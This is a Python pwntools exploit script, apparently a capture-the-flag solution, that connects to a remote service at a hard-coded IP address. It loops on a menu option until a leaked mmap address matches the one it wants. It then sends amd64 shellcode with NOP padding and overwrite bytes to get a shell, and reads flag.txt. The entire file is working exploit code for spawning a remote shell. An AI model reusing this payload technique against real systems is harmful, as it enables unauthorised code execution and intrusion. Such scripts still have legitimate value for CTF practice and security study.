from pwn import *

GOOD_MMAP = 0x90904000


def choose_from_menu(io, choice):
    io.sendlineafter('beer\n\n', choice)


def beer(io):
    choose_from_menu(io, 'b')
    io.recvuntil('@')
    address_str = io.recvline()[:-1]
    if address_str != '(nil)':
        address = int(address_str, 16)
    else:
        address = 0
    return address


def solve():
    info("Starting")

    io = remote("116.203.18.177", 65432)

    try:
        while 1:
            mmap = beer(io)
            if mmap == GOOD_MMAP:
                break

        success('Success! Found the map!')
        success(hex(mmap))

        info('mmap: {}'.format(hex(mmap)))

        payload = str(asm(shellcraft.amd64.sh(), arch='amd64'))
        payload += '\x90' * (512 - len(payload))
        payload += '\x98\xff'
        payload += '\x90' * (0xf7f - len(payload))
        payload += '\x00\x40\x90\x90\x00\x00\x00\x00'
        payload += '\x90' * (4096 - len(payload))

        choose_from_menu(io, 'h')
        io.sendlineafter('gib:\n', payload)
        io.sendline("cat flag.txt")
        io.interactive()
    finally:
        io.close()


def main():
    while 1:
        try:
            solve()
        except KeyboardInterrupt:
            break
        except:
            pass


if __name__ == '__main__':
    main()
